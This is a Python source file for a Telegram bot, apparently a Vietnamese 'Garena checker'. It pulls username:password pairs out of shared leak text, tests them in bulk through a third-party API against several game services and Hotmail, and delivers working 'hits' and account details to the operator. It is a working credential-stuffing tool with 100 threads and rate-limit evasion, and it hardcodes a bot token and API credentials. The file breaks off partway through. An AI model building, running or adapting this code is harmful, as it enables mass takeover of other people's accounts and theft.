# bot.py - GARENA CHECKER BOT V3.7 - API FIX ULTIMATE
# Tác giả: palofsc
# Mục đích: Bot Telegram check acc với API chuẩn GET params

import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from collections import defaultdict
import random

def install_package(package_name):
    """Cài đặt package nếu chưa có"""
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

# Cài đặt thư viện cần thiết
for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

# ========== FIX CHO RENDER WEB SERVICE ==========
import os as os_module
import threading as threading_module
from http.server import HTTPServer, BaseHTTPRequestHandler

class RenderHandler(BaseHTTPRequestHandler):
    """Xử lý HTTP request để Render giữ bot sống"""
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = """<!DOCTYPE html>
<html>
<head><title>Garena Checker Bot</title></head>
<body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:#00ff00;">
<h1>Garena Checker Bot V3.7</h1>
<p>Status: <b style="color:#00ff00;">ALIVE</b></p>
<p>Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;">@baohuyno1</a></p>
<p>Version: <b>3.7 - API FIX ULTIMATE</b></p>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/ping':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
    
    def log_message(self, format, *args):
        """Tắt log để tránh spam"""
        pass

def start_render_server():
    """Khởi động HTTP server cho Render"""
    try:
        port = int(os_module.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Render web server chay tren port {port}")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Loi web server: {e}")

# Chạy web server trong thread riêng
threading_module.Thread(target=start_render_server, daemon=True).start()
# ==============================================

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 100
DEFAULT_TIMEOUT = 30
DEFAULT_RETRIES = 3
API_DELAY = 0.3

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_UNKNOWN = "unknown.txt"
OUTPUT_ERROR = "error.txt"
OUTPUT_RESULT = "result_full.txt"
OUTPUT_CLEAN = "clean_accounts.txt"
OUTPUT_LOC = "loc_accounts.txt"

MAX_MESSAGE_LENGTH = 4000

# ========== DANH SÁCH SERVICE - CHUẨN API ==========
SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Lien Quan + FC Online",
        "icon": "🎮",
        "priority": 1,
        "method": "GET",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍",
        "priority": 2,
        "method": "GET",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱",
        "priority": 3,
        "method": "GET",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫",
        "priority": 4,
        "method": "GET",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧",
        "priority": 5,
        "method": "GET",
        "params": ["tk", "mk"],
        "extra_params": {"keyword": ""}
    },
    "fc": {
        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽",
        "priority": 6,
        "method": "GET",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack (Tat ca)",
        "icon": "📦",
        "priority": 7,
        "method": "GET",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    }
}

# ========== BIẾN TOÀN CỤC ==========
checking = False
stop_event = threading.Event()
pending_accounts = []
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
bot_start_time = datetime.now()
cache_results = {}
cache_lock = threading.Lock()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

def is_admin(chat_id):
    """Kiểm tra quyền admin"""
    return str(chat_id) == str(ADMIN_CHAT_ID)

# ========== HÀM GỬI TIN NHẮN ==========
def safe_send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    """Gửi tin nhắn an toàn, tự chia nhỏ nếu quá dài"""
    if not text:
        return
    
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        current_part = ""
        lines = text.split('\n')
        
        for line in lines:
            if len(current_part) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        
        if current_part:
            parts.append(current_part)
        
        for i, part in enumerate(parts):
            try:
                if i == len(parts) - 1 and reply_markup:
                    bot.send_message(chat_id, part.strip(), parse_mode=parse_mode, reply_markup=reply_markup)
                else:
                    bot.send_message(chat_id, part.strip(), parse_mode=parse_mode)
                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Loi gui tin nhan: {e}")
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            print(f"[!] Loi gui tin nhan: {e}")

# ========== TẠO NÚT BẤM ==========
def create_main_keyboard():
    """Tạo bàn phím chính"""
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    buttons = [
        KeyboardButton("📝 Gui TK MK"),
        KeyboardButton("📁 Gui File TXT"),
        KeyboardButton("🔍 Loc TK MK"),
        KeyboardButton("📊 Trang thai"),
        KeyboardButton("📥 Tai Hits"),
        KeyboardButton("📥 Tai Dead"),
        KeyboardButton("📥 Tai Loc"),
        KeyboardButton("📥 Tai Report"),
        KeyboardButton("⚡ Check All"),
        KeyboardButton("⏹ Dung check"),
        KeyboardButton("👤 Admin"),
        KeyboardButton("📋 Service")
    ]
    keyboard.add(*buttons)
    return keyboard

def create_service_keyboard():
    """Tạo bàn phím chọn service"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = []
    
    for key, value in SERVICE_ROUTES.items():
        btn = InlineKeyboardButton(
            f"{value['icon']} {value['desc']}",
            callback_data=f"check_{key}"
        )
        buttons.append(btn)
    
    buttons.append(InlineKeyboardButton("⚡ Check All", callback_data="check_all"))
    keyboard.add(*buttons)
    return keyboard

def create_admin_keyboard():
    """Tạo bàn phím admin"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("👤 Admin", url="https://t.me/baohuyno1"),
        InlineKeyboardButton("📊 Status", callback_data="admin_status"),
        InlineKeyboardButton("📥 Hits", callback_data="admin_hits"),
        InlineKeyboardButton("📥 Dead", callback_data="admin_dead"),
        InlineKeyboardButton("📥 Loc", callback_data="admin_loc"),
        InlineKeyboardButton("📥 Report", callback_data="admin_report"),
        InlineKeyboardButton("⏹ Stop", callback_data="admin_stop"),
        InlineKeyboardButton("🗑 Clear", callback_data="admin_clear"),
        InlineKeyboardButton("📋 Services", callback_data="admin_services")
    ]
    keyboard.add(*buttons)
    return keyboard

# ========== LỌC TK MK ULTRA CHUYÊN NGHIỆP ==========
def loc_tk_mk_only(content):
    """
    LỌC TÀI KHOẢN CHUYÊN NGHIỆP
    Hỗ trợ mọi định dạng share
    """
    accounts = []
    seen = set()
    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
    
    if not content:
        return accounts, stats_loc
    
    # Pattern chuẩn user:pass
    pattern_standard = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50}):([a-zA-Z0-9_.@!$%^&*()\-]{1,100})(?![a-zA-Z0-9_])'
    
    # Pattern FINAL = user:pass
    pattern_final = r'FINAL\s*[=:]\s*([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50}):([a-zA-Z0-9_.@!$%^&*()\-]{1,100})'
    
    # Từ khóa loại bỏ
    skip_patterns = [
        r'^https?://', r'^www\.', r'\.com$', r'\.net$', r'\.org$',
        r'^shop', r'^share', r'^final', r'^name', r'^level', r'^rank',
        r'^status', r'^time', r'^date', r'^email', r'^phone', r'^sdt',
        r'^cccd', r'^fb', r'^ban', r'^ss', r'^sss', r'^anime', r'^other',
        r'^tinh', r'^quan_huy', r'^lich_su', r'^vo_game', r'^quoc_gia',
        r'^tuong', r'^skin', r'^authen', r'^so:', r'^qu[âa]n', r'^v[ôo]'
    ]
    
    # Thử tìm FINAL pattern trước
    final_matches = re.findall(pattern_final, content, re.IGNORECASE)
    if final_matches:
        for user, pwd in final_matches:
            key = f"{user}:{pwd}"
            if key not in seen and is_valid_account(user, pwd, skip_patterns):
                seen.add(key)
                accounts.append((user, pwd))
                stats_loc["valid"] += 1
            elif key in seen:
                stats_loc["duplicate"] += 1
            else:
                stats_loc["invalid"] += 1
        stats_loc["total"] = len(final_matches)
        return accounts, stats_loc
    
    # Tách thành các dòng
    lines = content.split('\n')
    stats_loc["total"] = len(lines)
    
    # Xử lý từng dòng
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        matches = re.findall(pattern_standard, line)
        if matches:
            for user, pwd in matches:
                if is_valid_account(user, pwd, skip_patterns):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    
    # Nếu không tìm thấy, thử tìm trong toàn bộ nội dung
    if not accounts:
        all_matches = re.findall(pattern_standard, content)
        for user, pwd in all_matches:
            if is_valid_account(user, pwd, skip_patterns):
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
                    stats_loc["valid"] += 1
                else:
                    stats_loc["duplicate"] += 1
            else:
                stats_loc["invalid"] += 1
    
    return accounts, stats_loc

def is_valid_account(user, pwd, skip_patterns):
    """Kiểm tra tài khoản hợp lệ"""
    if len(user) < 2 or len(pwd) < 1:
        return False
    
    if len(user) > 50 or len(pwd) > 100:
        return False
    
    user_lower = user.lower()
    for pattern in skip_patterns:
        if re.match(pattern, user_lower):
            return False
    
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@-]*$', user):
        return False
    
    if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-]+$', pwd):
        return False
    
    if user.lower() in ['http', 'https', 'www', 'com', 'net', 'org', 'shop', 'share', 'final', 'name', 'level', 'rank', 'status', 'time', 'date', 'email', 'phone', 'sdt', 'cccd', 'fb', 'ban', 'ss', 'sss', 'anime', 'other']:
        return False
    
    return True

# ========== LƯU FILE LOC ==========
def save_loc_file(accounts):
    """Lưu danh sách đã lọc vào file"""
    with file_lock:
        with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")

# ========== CHECK API - CHUẨN GET PARAMS ==========
def check_account_api(username, password, service):
    """
    Gọi API để kiểm tra tài khoản
    Sử dụng đúng định dạng GET params theo API docs
    """
    cache_key = f"{username}:{password}:{service}"
    with cache_lock:
        if cache_key in cache_results:
            return cache_results[cache_key]
    
    service_info = SERVICE_ROUTES.get(service, {})
    route = service_info.get("route", "/api/lienquan")
    param_names = service_info.get("params", ["tk", "mk"])
    extra_params = service_info.get("extra_params", {})
    
    url = f"{API_BASE}{route}"
    
    # Tạo params theo đúng format API yêu cầu
    # Format: ?username=api_user&password=api_pass&tk=acc&mk=pass&proxy=
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD
    }
    
    # Thêm tk và mk vào params
    if len(param_names) >= 2:
        params[param_names[0]] = username
        params[param_names[1]] = password
    else:
        params["tk"] = username
        params["mk"] = password
    
    # Thêm extra params nếu có
    for key, value in extra_params.items():
        params[key] = value
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Connection": "keep-alive"
    }
    
    # Thêm delay ngẫu nhiên để tránh rate limit
    time.sleep(API_DELAY + random.uniform(0, 0.1))
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            print(f"[DEBUG] URL: {url}")
            print(f"[DEBUG] Params: {json.dumps(params, ensure_ascii=False)}")
            
            # Sử dụng GET request với params
            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
            
            print(f"[DEBUG] Status: {resp.status_code}")
            print(f"[DEBUG] Response: {resp.text[:500]}")
            
            if resp.status_code == 200:
                try:
                    result_data = resp.json()
                    
                    if isinstance(result_data, dict):
                        is_hit = False
                        
                        # Check status
                        status_val = result_data.get("status")
                        if status_val is not None:
                            if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS"]:
                                is_hit = True
                            elif status_val in [False, "false", 0, "0", "False", "FALSE", "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
                                is_hit = False
                        
                        # Check success
                        success_val = result_data.get("success")
                        if not is_hit and success_val is not None:
                            if success_val in [True, "true", 1, "1", "True", "TRUE"]:
                                is_hit = True
                            elif success_val in [False, "false", 0, "0", "False", "FALSE"]:
                                is_hit = False
                        
                        # Check result
                        result_val = result_data.get("result")
                        if result_val is not None:
                            result_str = str(result_val).lower()
                            if result_str in ["hit", "true", "success", "valid", "1", "live", "ok"]:
                                is_hit = True
                            elif result_str in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
                                is_hit = False
                        
                        # Check message
                        message_val = result_data.get("message", "")
                        if message_val:
                            msg_lower = str(message_val).lower()
                            if any(word in msg_lower for word in ["thành công", "thanh cong", "success", "valid", "hit", "đúng", "dung", "live", "ok"]):
                                is_hit = True
                            elif any(word in msg_lower for word in ["thất bại", "that bai", "fail", "invalid", "dead", "sai", "không đúng", "khong dung", "die", "error"]):
                                is_hit = False
                        
                        # Check data
                        data_val = result_data.get("data")
                        if data_val is not None:
                            if isinstance(data_val, dict) and data_val:
                                is_hit = True
                            elif isinstance(data_val, list) and data_val:
                                is_hit = True
                            elif isinstance(data_val, str) and data_val:
                                is_hit = True
                        
                        # Check info fields
                        info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank", "email", "phone", "sdt"]
                        for field in info_fields:
                            if field in result_data and result_data[field] is not None and result_data[field] != "":
                                is_hit = True
                                break
                        
                        # Lưu toàn bộ thông tin response
                        result_data["_raw_response"] = result_data.copy()
                        result_data["result"] = "hit" if is_hit else "dead"
                        result_data["_is_hit"] = is_hit
                        
                        print(f"[DEBUG] Final Result: {result_data['result']}")
                        
                        with cache_lock:
                            cache_results[cache_key] = result_data
                        return result_data
                    else:
                        result = {"result": "unknown", "_raw_response": result_data}
                        with cache_lock:
                            cache_results[cache_key] = result
                        return result
                        
                except json.JSONDecodeError:
                    text_lower = resp.text.lower()
                    if any(word in text_lower for word in ["success", "ok", "true", "hit", "valid", "live"]):
                        result = {"result": "hit", "_raw_response": resp.text}
                    elif any(word in text_lower for word in ["fail", "false", "dead", "invalid", "error", "die"]):
                        result = {"result": "dead", "_raw_response": resp.text}
                    else:
                        result = {"result": "unknown", "_raw_response": resp.text}
                    
                    with cache_lock:
                        cache_results[cache_key] = result
                    return result
                    
            elif resp.status_code == 429:
                time.sleep(5 * (attempt + 1))
                continue
            elif resp.status_code == 401:
                # Sai API credentials
                result = {"result": "error", "_error": "Invalid API credentials"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            elif resp.status_code == 403:
                # Forbidden
                result = {"result": "error", "_error": "Forbidden access"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            else:
                time.sleep(1)
                continue
                
        except requests.exceptions.Timeout:
            time.sleep(2)
            continue
        except requests.exceptions.ConnectionError:
            time.sleep(3)
            continue
        except Exception as e:
            print(f"[DEBUG] Exception: {e}")
            time.sleep(2)
            continue
    
    result = {"result": "error", "_error": "All retries failed"}
    with cache_lock:
        cache_results[cache_key] = result
    return result

# ========== LƯU KẾT QUẢ ==========
def save_result(username, password, status, service=""):
    """Lưu kết quả vào các file tương ứng"""
    with file_lock:
        if status == "hit":
            with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        elif status == "dead":
            with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        elif status == "unknown":
            with open(OUTPUT_UNKNOWN, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        else:
            with open(OUTPUT_ERROR, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        
        with open(OUTPUT_RESULT, 'a', encoding='utf-8') as f:
            f.write(f"{username}:{password}|{status}|{service}\n")

# ========== FORMAT THÔNG TIN HIT ==========
def format_hit_info(username, password, service, result_data):
    """Format thông tin hit để gửi cho admin"""
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
    
    msg = f"""
{icon} <b>HIT - {service_desc}</b>
🔑 <code>{username}:{password}</code>
"""
    
    if isinstance(result_data, dict):
        skip_fields = ["result", "_is_hit", "_raw_response", "_error", "status", "success", "api_version", "auth", "common_params", "routes"]
        
        info_lines = []
        for key, value in result_data.items():
            if key not in skip_fields and value is not None and value != "" and value != {} and value != []:
                if isinstance(value, (str, int, float)):
                    info_lines.append(f"📌 {key}: <code>{value}</code>")
                elif isinstance(value, dict):
                    for sub_key, sub_value in value.items():
                        if sub_value is not None and sub_value != "" and sub_value != {} and sub_value != []:
                            if isinstance(sub_value, (str, int, float)):
                                info_lines.append(f"📌 {sub_key}: <code>{sub_value}</code>")
                elif isinstance(value, list) and value:
                    info_lines.append(f"📌 {key}: <code>{len(value)} items</code>")
        
        if info_lines:
            msg += "\n".join(info_lines[:15])
            msg += "\n"
    
    return msg

# ========== CHECK ĐƠN ==========
def check_single(chat_id, username, password, service="lienquan"):
    """Kiểm tra một tài khoản đơn lẻ"""
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
    
    result = check_account_api(username, password, service)
    result_type = result.get("result", "unknown")
    
    save_result(username, password, result_type, service)
    
    if result_type == "hit":
        hit_msg = format_hit_info(username, password, service, result)
        safe_send_message(chat_id, hit_msg)
    elif result_type == "dead":
        safe_send_message(chat_id, f"❌ DEAD - {service_desc}\n🔑 {username}:{password}")
    else:
        error_msg = result.get("_error", "")
        if error_msg:
            safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}\n💬 {error_msg}")
        else:
            safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}")

# ========== CHECK NHIỀU ==========
def check_batch(chat_id, accounts, service):
    """Kiểm tra nhiều tài khoản"""
    global checking, stats
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    checking = True
    stop_event.clear()
    
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "unknown": 0,
        "start_time": time.time()
    }
    
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    
    safe_send_message(chat_id, f"""
{icon} <b>BAT DAU CHECK</b>
📊 Tong: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{DEFAULT_THREADS}</code>
""")
    
    def process_single(user, pwd):
        """Xử lý một tài khoản trong batch"""
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service)
        result_type = result.get("result", "unknown")
        
        save_result(user, pwd, result_type, service)
        
        with stats_lock:
            stats["checked"] += 1
            
            if result_type == "hit":
                stats["hits"] += 1
                try:
                    hit_msg = format_hit_info(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
            else:
                stats["errors"] += 1
            
            if stats["checked"] % 50 == 0:
                try:
                    elapsed = time.time() - stats["start_time"]
                    speed = stats["checked"] / elapsed if elapsed > 0 else 0
                    percent = (stats["checked"] / total) * 100
                    safe_send_message(chat_id, f"""
📊 <b>TIEN DO</b>
✅ Checked: <code>{stats['checked']}/{total}</code> ({percent:.1f}%)
🔴 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
                except:
                    pass
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_single, user, pwd): (user, pwd) 
                   for user, pwd in accounts}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    
    result_msg = f"""
✅ <b>CHECK HOAN TAT!</b>
📊 Tong: <code>{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⏱ Thoi gian: <code>{elapsed:.1f}s</code>
"""
    safe_send_message(chat_id, result_msg)
    
    if stats["hits"] > 0 and os.path.exists(OUTPUT_HITS):
        with open(OUTPUT_HITS, 'rb') as f:
            try:
                bot.send_document(chat_id, f, caption=f"✅ hits.txt ({stats['hits']} acc)")
            except:
                pass

# ========== CHECK TẤT CẢ SERVICE ==========
def check_all_services(chat_id, accounts):
    """Kiểm tra tất cả service cho danh sách tài khoản"""
    global checking
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    if not accounts:
        safe_send_message(chat_id, "❌ Khong co accounts!")
        return
    
    checking = True
    stop_event.clear()
    
    total_accounts = len(accounts)
    total_services = len(SERVICE_ROUTES)
    
    safe_send_message(chat_id, f"""
⚡ <b>CHECK TAT CA SERVICE</b>
📊 Accounts: <code>{total_accounts}</code>
📋 Services: <code>{total_services}</code>
""")
    
    stats_all = {
        "total": total_accounts * total_services,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    def process_all(user, pwd, service):
        """Xử lý một tài khoản với một service"""
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service)
        result_type = result.get("result", "unknown")
        
        save_result(user, pwd, result_type, service)
        
        with stats_lock:
            stats_all["checked"] += 1
            if result_type == "hit":
                stats_all["hits"] += 1
                try:
                    hit_msg = format_hit_info(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats_all["dead"] += 1
            else:
                stats_all["errors"] += 1
    
    all_tasks = [(user, pwd, service) for user, pwd in accounts for service in SERVICE_ROUTES.keys()]
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_all, user, pwd, service): (user, pwd, service) 
                   for user, pwd, service in all_tasks}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats_all["start_time"]
    
    safe_send_message(chat_id, f"""
✅ CHECK ALL HOAN TAT!
🔴 Hits: {stats_all['hits']}
❌ Dead: {stats_all['dead']}
⚠️ Errors: {stats_all['errors']}
⏱ Time: {elapsed:.1f}s
""")

# ========== XỬ LÝ CALLBACK ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """Xử lý các nút bấm inline"""
    global pending_accounts
    
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Ban khong co quyen!")
        return
    
    data = call.data
    
    if data.startswith("check_"):
        service = data.replace("check_", "")
        
        if service == "all":
            if pending_accounts:
                accounts = pending_accounts
                pending_accounts = []
                threading.Thread(target=check_all_services, args=(call.message.chat.id, accounts)).start()
            else:
                bot.answer_callback_query(call.id, "❌ Khong co accounts!")
            return
        
        if service not in SERVICE_ROUTES:
            bot.answer_callback_query(call.id, "❌ Service khong hop le!")
            return
        
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        if pending_accounts:
            accounts = pending_accounts
            pending_accounts = []
            
            if len(accounts) == 1:
                user, pwd = accounts[0]
                threading.Thread(target=check_single, args=(call.message.chat.id, user, pwd, service)).start()
            else:
                threading.Thread(target=check_batch, args=(call.message.chat.id, accounts, service)).start()
        else:
            bot.answer_callback_query(call.id, "❌ Khong co accounts!")
    
    elif data == "admin_status":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            safe_send_message(call.message.chat.id, f"""
📊 TRANG THAI
🔄 Dang check: YES
✅ Checked: {stats['checked']}/{stats['total']}
🔴 HIT: {stats['hits']}
❌ DEAD: {stats['dead']}
⚠️ Errors: {stats['errors']}
⚡ Speed: {speed:.1f} acc/s
""")
        else:
            safe_send_message(call.message.chat.id, "💤 Bot dang ranh")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="✅ hits.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co hits!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="❌ dead.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co dead!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_loc":
        try:
            with open(OUTPUT_LOC, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="📥 loc_accounts.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co file loc!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_report":
        try:
            with open(OUTPUT_RESULT, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="📊 report.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co report!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_stop":
        stop_event.set()
        checking = False
        safe_send_message(call.message.chat.id, "🛑 Da dung check!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_clear":
        pending_accounts = []
        safe_send_message(call.message.chat.id, "✅ Da xoa pending!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_services":
        msg = "📋 DANH SACH SERVICE\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} {value['desc']}\n"
        safe_send_message(call.message.chat.id, msg)
        bot.answer_callback_query(call.id)
    
    bot.answer_callback_query(call.id)

# ========== XỬ LÝ TEXT ==========
@bot.message_handler(content_types=['text'])
def handle_text(message):
    """Xử lý tin nhắn văn bản"""
    global pending_accounts
    
    if not is_admin(message.chat.id):
        return
    
    text = message.text.strip()
    
    if text == "📝 Gui TK MK":
        safe_send_message(message.chat.id, """
📌 GUI TK MK
Gui truc tiep user:pass

VD:
anhduckim1:kimanhduc1
""")
        return
    
    elif text == "📁 Gui File TXT":
        safe_send_message(message.chat.id, "📌 Gui file .txt chua danh sach")
        return
    
    elif text == "🔍 Loc TK MK":
        safe_send_message(message.chat.id, """
🔍 LOC TK MK CHUYÊN NGHIỆP
Gui file .txt hoặc text share
Bot tự động lọc user:pass từ mọi định dạng
""")
        return
    
    elif text == "📊 Trang thai":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            safe_send_message(message.chat.id, f"""
📊 TRANG THAI
🔄 Dang check: YES
✅ Checked: {stats['checked']}/{stats['total']}
🔴 HIT: {stats['hits']}
❌ DEAD: {stats['dead']}
⚠️ Errors: {stats['errors']}
⚡ Speed: {speed:.1f} acc/s
""")
        else:
            safe_send_message(message.chat.id, "💤 Bot dang ranh")
        return
    
    elif text == "📥 Tai Hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="✅ hits.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co hits!")
        return
    
    elif text == "📥 Tai Dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="❌ dead.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co dead!")
        return
    
    elif text == "📥 Tai Loc":
        try:
            with open(OUTPUT_LOC, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="📥 loc_accounts.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co file loc!")
        return
    
    elif text == "📥 Tai Report":
        try:
            with open(OUTPUT_RESULT, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="📊 report.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co report!")
        return
    
    elif text == "⚡ Check All":
        if pending_accounts:
            accounts = pending_accounts
            pending_accounts = []
            threading.Thread(target=check_all_services, args=(message.chat.id, accounts)).start()
        else:
            safe_send_message(message.chat.id, "❌ Khong co accounts!")
        return
    
    elif text == "⏹ Dung check":
        stop_event.set()
